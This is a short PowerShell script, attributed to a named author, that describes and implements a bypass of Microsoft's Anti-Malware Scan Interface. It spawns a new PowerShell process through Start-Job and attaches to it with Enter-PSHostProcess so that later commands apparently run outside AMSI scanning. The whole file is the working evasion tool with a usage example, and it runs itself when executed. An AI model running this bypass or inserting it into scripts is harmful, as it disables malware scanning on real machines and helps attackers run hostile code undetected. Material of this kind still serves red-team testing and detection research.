<#

.SYNOPSIS 
	
	In the spirit of the KISS Principle (https://en.wikipedia.org/wiki/KISS_principle)
	
	Bypasses Microsoft's Anti-Malware Scan Interface for a PowerShell session process started through the "Start-Job" cmdlet, the PID of which is accessed using "Enter-PSHostProcess".
	
.EXAMPLE

	PS> .\Bypass-AMSI9000.ps1

.NOTES

	Author: Fabrizio Siciliano (@0rbz_)
	
#>
function Bypass-AMSI9000 {
	
	if ($PSVersionTable.PSVersion.Major -eq "2") {
			Write "`n [!] This function requires PowerShell version greater than 2.0.`n"
			return
	}
	Try {
		
		Start-Job -Name "foo" -ScriptBlock {(Start-Process -NoNewWindow powershell)} | Out-Null
		
		Write-Output "Working..."
		sleep 3
	}
	Catch {
		Write-Output "Unknown Error."
	}
	foreach ($Process in $(Get-Process powershell | Sort-Object id -Desc | Select-Object -first 1).Id) {
		Try {
			Enter-PSHostProcess -Id $Process
		}
		Catch {
		}
	}
}
Bypass-AMSI9000
